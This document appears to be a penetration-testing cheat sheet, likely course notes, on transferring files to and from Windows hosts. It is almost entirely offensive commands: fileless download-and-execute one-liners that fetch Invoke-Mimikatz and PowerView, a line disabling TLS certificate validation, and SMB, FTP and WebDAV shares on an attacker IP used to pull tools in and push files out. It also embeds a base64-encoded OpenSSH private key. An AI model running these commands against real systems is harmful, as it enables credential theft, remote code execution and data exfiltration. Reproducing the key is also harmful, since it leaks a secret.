# Windows File Transfer Methods

## "Microsoft Astaroth Attack" - Using BITSAdmin to Transfer Files

1. malicious link in a spear-phishing email led to LNK file

2. WMIC tool used to execute the LNK file

3. JavaScript code in the LNK file downloads a payload from a remote server using BITSAdmin

4. regsvr32.exe used to execute the downloaded payload

5. Astaroth malware was injected into the Userinit.exe process


## PowerShell Base64 encode and decode

```bash

# Encode a file to Base64

cat id_rsa |base64 -w 0; echo

# Decode a Base64 string in powershell

PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))

```

## PowerShell Web Downloads

```powershell

# File download

(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

# Fileless Method

IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')

(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX

# Invoke-WebRequest Method

Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

# Avoid Internet Explorer first-launch prompt

Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

# Bypass SSL/TLS certificate checks

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

```

## SMB Downloads

```bash

# Setup SMB server using impacket

sudo impacket-smbserver share /path/to/share -smb2support -user test -password test

```

```powershell

copy \\<Attacker_IP>\share\file.txt C:\Users\Public\file.txt

net use n: \\<Attacker_IP>\share /user:test test

```


## FTP Downloads

```bash

# Setup FTP server using Python

sudo pip3 install pyftpdlib

sudo python3 -m pyftpdlib --port 21

```

```powershell

# Transferring Files from FTP using PowerShell

(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')

# Create a Command File for the FTP Cliehnt and Download the Target File

echo open <ip> > ftpcommand.txt
echo USER <username> >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt

```

## Upload Operations

```powershell

[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

```

```bash

echo <Base64_String> | base64 -d > hosts

md5sum hosts

```

## Powershell Web Uploads

```bash

# Installing a Configured WebServer with Upload

pip3 install uploadserver 

python3 -m uploadserver

```

```powershell

IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

```

## Powershell Base64 Web Uploads

```powershell

$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))

Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64

```

```bash

nc -lvnp 8000

echo <Base64_String> | base64 -d > hosts

```

## SMB Uploads

```bash

sudo pip3 install wsgidav cheroot

sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

```

```powershell

#Connecting to Webdav Share

dir \\<Attacker_IP>\DavWWWRoot\

copy C:\Windows\System32\drivers\etc\hosts \\<Attacker_IP>\DavWWWRoot\hosts.txt


```

## FTP Uploads

```bash

sudo python3 -m pyftpdlib --port 21 --write

```


```powershell

(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')

# Create a Command File for the FTP Client and Upload the Target File

echo open <ip> > ftpcommand.txt
echo USER <username> >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT C:\Windows\System32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt

```
















